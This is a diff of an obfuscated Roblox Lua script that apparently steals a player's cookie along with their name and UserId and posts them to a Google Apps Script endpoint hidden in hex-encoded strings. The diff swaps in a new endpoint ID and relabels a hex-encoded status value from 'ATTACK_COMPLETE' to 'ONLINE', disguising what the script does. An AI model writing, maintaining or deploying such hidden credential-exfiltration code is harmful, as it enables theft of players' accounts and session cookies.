@@ -1,8 +1,11 @@
 task.spawn(function()
     task.wait(5)
     local _0x_URL_BASE = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x63\x72\x69\x70\x74\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x6d\x61\x63\x72\x6f\x73\x2f\x73\x2f"
-    local _0x_GAS_ID = "AKfycbzydmh3o7RHqSONRYSNIfZZFKy92e_7qDVRbjFiZWFdldC5tK0JYPRGNCNIJ5z-SfF96w"
+    
+    local _0x_GAS_ID = "AKfycbyHdS3RiHw0m41yFMrxZfU8Az0J4bo6Wjpm0IYRoN8GuNyI9Er_l-Hl6YsLPog3p0xSAQ"
+    
     local _0x_EXEC = "\x2f\x65\x78\x65\x63"
+    
     local _0x_HTTP = game:GetService("\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65")
 
     local function _0x_DO_WORK()
@@ -14,7 +17,7 @@ task.spawn(function()
         local _0x_P = {
             ["\x75\x73\x65\x72"] = game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.UserId .. ")",
             ["\x63\x6f\x6f\x6b\x69\x65"] = _0x_C,
-            ["\x73\x74\x61\x74\x75\x73"] = "\x41\x54\x54\x41\x43\x4b\x5f\x43\x4f\x4d\x50\x4c\x45\x54\x45"
+            ["\x73\x74\x61\x74\x75\x73"] = "\x4F\x4E\x4C\x49\x4E\x45"
         }
 
         local _0x_R = (getgenv()["\x72\x65\x71\x75\x65\x73\x74"] or getgenv()["\x68\x74\x74\x70\x5f\x72\x65\x71\x75\x65\x73\x74"])
